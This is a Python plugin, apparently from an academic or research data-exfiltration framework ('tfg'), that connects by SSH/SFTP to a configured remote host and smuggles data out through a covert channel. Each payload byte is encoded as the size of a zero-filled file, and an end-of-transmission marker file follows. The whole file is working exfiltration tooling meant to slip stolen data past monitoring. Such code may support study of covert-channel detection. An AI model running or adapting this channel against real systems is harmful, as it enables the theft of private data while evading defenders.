
from __future__ import annotations
from typing import Dict, Any, Iterable
import paramiko

from tfg.plugins.api import ExfilClientPlugin

BASE = 4096

class SshClientSize(ExfilClientPlugin):
    canal = "SSH"
    metodo = 3
    name = "ssh_client_size"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config["host"]; port = int(config.get("port", 22))
        user = config["user"]; password = config.get("password")
        pkey_path = config.get("pkey_path")
        remote_dir = config.get("remote_dir") or "."
        exfil_id = config.get("exfil_id") or "tfg"

        key = paramiko.RSAKey.from_private_key_file(pkey_path) if pkey_path else None
        ssh = paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=user, password=password, pkey=key, look_for_keys=False)
        sftp = ssh.open_sftp()
        try:
            try: sftp.chdir(remote_dir)
            except IOError: sftp.mkdir(remote_dir); sftp.chdir(remote_dir)
            seq = 0; total = 0
            for ch in payload_iter:
                for b in ch:
                    name = f"{exfil_id}.sz.{seq:06d}"
                    with sftp.file(name, "wb") as f:
                        f.write(b"\x00" * (BASE + b))
                    total += 1; seq += 1
            sftp.file(f"{exfil_id}.EOT", "wb").close()
            return {"ok": True, "files": seq, "bytes": total}
        finally:
            try: sftp.close(); ssh.close()
            except: pass
